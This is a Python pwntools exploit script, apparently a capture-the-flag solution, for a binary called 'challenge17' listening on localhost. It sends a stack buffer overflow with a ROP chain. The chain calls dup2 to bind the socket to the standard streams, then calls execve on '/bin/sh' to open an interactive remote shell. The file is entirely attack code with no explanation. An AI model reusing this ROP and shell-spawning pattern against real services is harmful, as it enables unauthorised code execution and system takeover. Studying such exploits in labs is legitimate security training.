#!/usr/bin/python

import struct
from pwn import *

e = ELF("./challenge17")
tube = connect("localhost", 5002)

offset = 152

def doBof(payload):
        print tube.recvuntil("> ")
        tube.send("1");

        print tube.recv()
        tube.send(str(len(payload)));

        print tube.recv()
        tube.send(payload)

        print tube.recv()

	tube.interactive()


payload = "A" * offset

# data 

sh_addr = 0x400ed8


# gadgets 

# 0x0000000000400c91: pop rax; ret; 
pop_rax = 0x0000000000400c91

# 0x0000000000400eb3: pop rdi; ret;
pop_rdi = 0x0000000000400eb3

# 0x0000000000400eb1: pop rsi; pop r15; ret;
pop_rsi_r15 = 0x0000000000400eb1

# 0x0000000000400c93: syscall; ret; 
syscall = 0x0000000000400c93


# Start ROP chain 

# dup2() syscall is 33

# dup2(4, 0)
payload += p64 ( pop_rax ) 
payload += p64 ( 33 )
payload += p64 ( pop_rdi ) 
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 0 )
payload += p64 ( 0xdeadbeef1 )
payload += p64 ( syscall ) 


# dup2(4, 1)
payload += p64 ( pop_rax ) 
payload += p64 ( 33 )
payload += p64 ( pop_rdi ) 
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 1 )
payload += p64 ( 0xdeadbeef2 )
payload += p64 ( syscall ) 


# dup2(4, 2)
payload += p64 ( pop_rax ) 
payload += p64 ( 33 )
payload += p64 ( pop_rdi ) 
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 2 )
payload += p64 ( 0xdeadbeef3 )
payload += p64 ( syscall ) 


# execve 
payload += p64 ( pop_rdi )
payload += p64 ( sh_addr )
payload += p64 ( pop_rsi_r15 )
payload += p64 ( 0x6020e0 )
payload += p64 ( 0xdeadbeef4 )
payload += p64 ( pop_rax)
payload += p64 ( 59 )
payload += p64 ( syscall )

payload += p64 ( 0x41414141 ) 
payload += p64 ( 0x42424242 ) 

doBof(payload)

